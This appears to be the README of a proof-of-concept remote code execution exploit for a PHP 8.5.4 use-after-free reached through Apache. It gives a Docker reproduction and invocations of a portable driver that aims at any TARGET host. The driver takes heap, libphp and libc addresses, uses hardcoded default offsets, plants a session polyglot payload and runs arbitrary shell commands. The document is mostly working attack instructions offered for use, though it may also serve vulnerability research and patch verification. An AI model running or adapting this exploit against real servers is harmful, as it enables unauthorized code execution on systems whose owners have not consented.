# Running the Apache PoC

## One-command Docker reproduction

For the easiest local reproduction:

```sh
cd apache-poc/docker
./run.sh
```

This builds pinned PHP 8.5.4 from its verified source tarball on Debian
Bookworm, starts a single-worker Apache prefork container bound only to
`127.0.0.1:18086`, runs the portable driver, and prints the resulting `id` and
`uname -a` output. See `docker/README.md` for the explicit reproduction-only
address bridge and session seeder limitations.

## Portable single-file driver

`apache_poc.py` contains only the network primer, multipart groom, forged
context, session-polyglot generation, and final request. It does **not** invoke
GDB, inspect `/proc`, run `nm`, restart services, read process memory, or depend
on the PHP source/build tree.

It therefore requires addresses obtained through a separate disclosure:

```sh
python3 apache_poc.py \
  --host TARGET --port 80 --path /index.php \
  --heap-base 0xHEAP_BASE \
  --module-base 0xLIBPHP_BASE \
  --libc-base 0xLIBC_BASE \
  --command 'id; uname -a'
```

The script primes the stale context, prints the exact PHP/shell session payload,
and pauses. Install that payload through the target application's legitimate
session-writing capability, then press Enter. Requests must reach the same
Apache worker.

Instead of bases, exact addresses may be supplied:

```sh
python3 apache_poc.py \
  --stale-context 0xADDR \
  --decode-target 0xADDR \
  --system 0xADDR
```

The default offsets (`+0x1c6000`, `+0x104a128`, libc `+0x4c490`) are for the
verified pristine Apache build. Supply exact addresses or corrected offsets for
another package.

Use `--no-pause` only when an external automation process installs the emitted
payload before the final request. The portable driver deliberately has no local
session-file access.

The command may not contain `|`, `#`, CR, or LF because those characters delimit
the PHP/shell polyglot.

## Lab-only proof harness

`apache_poc_lab.py` preserves the previous instrumentation-heavy harness. It
performs local address discovery, fresh-ASLR repetitions, GDB stack capture,
process-memory before/after checks, source validation, and service cleanup:

```sh
ssh -o 'ProxyCommand=ssh -o HostKeyAlias=10.10.10.2 root@10.0.0.1 -W %h:%p' \
  root@10.10.10.134 '/opt/php-uaf-lab/bgctx/apache_poc_lab.py'
```

The split proof and independent validator remain available as:

```text
/opt/php-uaf-lab/bgctx/apache-session-callback-clean-proof.sh
/opt/php-uaf-lab/bgctx/validate-apache-session-callback-clean.py
```

